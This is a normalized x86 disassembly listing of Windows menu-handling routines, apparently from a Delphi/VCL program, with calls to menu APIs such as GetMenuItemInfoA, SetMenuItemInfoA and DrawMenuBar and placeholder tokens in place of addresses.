lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40422c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_40448c
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4042ec
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_453284
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_453723
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404004
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4536e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4526c4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404004
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45372a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f90
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f90
lea eax [ ebp - 0x18 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
call sub_4538d8
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4526d4
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404378
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4530a0
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4526d4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4526d4
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40321c
mov eax [ ebp - 0x20 ]
call sub_40321c
mov eax [ ebp - 0x14 ]
call sub_40321c
mov eax [ ebp - 0xc ]
call sub_40321c
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_4530a0
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40422c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4526d4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_455224
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407ef0
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403fc0
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c570
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c570
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4526d4
push eax
mov edx esi
mov eax ebx
call sub_4526d4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_40448c
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407ef0
push ebp
mov eax [ ebp - 0x2c ]
call sub_453070
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_453070
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c570
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404004
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4526d4
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_4526d4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_455190
mov edx [ ebp - 0x40 ]
pop eax
call sub_403fc0
mov edx esi
mov eax ebx
call sub_4526d4
push eax
mov edx esi
mov eax ebx
call sub_4526d4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40422c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_40448c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_453124
mov eax [ ebp - 0x18 ]
call sub_40422c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4044cc
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404514
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_453124
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_453780
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4526c4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4526c4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_453904
test al al
je r-xdata
mov eax esi
call sub_4526c4
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4526d4
call sub_45375c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_4526d4
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4526d4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4526d4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4526d4
call sub_45375c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4526d4
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4526d4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4526d4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_4526d4
call sub_45375c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_4538d8
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4538d8
and eax 0x7f
mov al [ eax + rw-data ]
sub_453904
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_453904
and eax 0x7f
mov al [ eax + rw-data ]
sub_453930
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_450618
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41fb3c
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45465c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4539cc
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_40321c
mov eax [ esi + 0x44 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fb88
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_453a40
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_453a40
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_450184
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_452ac8
mov eax ebx
pop esi
pop ebx
retn
sub_453a80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_4526c4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_4526d4
call sub_453a80
pop ecx
test al al
je r-xdata
sub_453b18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_453a80
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_450184
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_453b48
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_453b18
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_454f14
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_453bb8
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_453b18
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_453bd4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_453b18
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_453284
mov ebx eax
xor edx edx
mov eax edi
call sub_453780
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_452bec
mov eax [ esi + 0x34 ]
call sub_452bec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_450b28
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4470c4
push eax
call DrawMenuBar
sub_453cc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_453cc0
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_453de5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_453b18
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_452bec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_453cb0
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_453e14
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42a640
xor eax eax
push ebp
push sub_453f12
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42a640
xor eax eax
push ebp
push sub_453ee7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_453cc0
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42a638
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453f19
mov eax [ rw-data ]
call sub_42a638
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_453b18
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_453f38
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4542bc
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4542bc
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_453ff4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_454590
mov eax ebx
call sub_4088a8
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_454094
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_453ff4
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4041dc
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40442c
lea edx [ ebp - 0x200 ]
call sub_40896c
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_454128
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_454198
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_454638
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_454638
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_454638
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_4541a4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_454094
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_454128
mov eax ebx
call sub_45465c
jmp r-xdata
sub_45420c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_454254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44e484
mov eax ebx
call sub_453a68
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44e4c8
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41fc0c
sub_454290
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41fe58
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_454254
sub_4542d4
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453b18
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_453b18
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_457668
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_454330
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_454405
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453b18
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453b18
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_4526c4
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4526d4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404154
mov eax [ ebp - 0x8 ]
push eax
